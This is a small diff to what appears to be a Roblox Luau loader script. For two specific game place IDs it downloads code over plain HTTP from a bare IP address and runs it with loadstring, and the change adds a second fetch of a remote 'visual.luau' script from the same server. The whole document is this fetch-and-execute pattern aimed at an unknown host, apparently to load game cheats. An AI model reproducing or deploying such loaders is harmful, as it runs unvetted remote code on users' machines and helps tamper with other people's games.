@@ -4,5 +4,6 @@ end
 
 if game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237 then
     ID="2307020c-2709-4aab-92fb-3c410bb3c73f";
+    RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
     loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 end
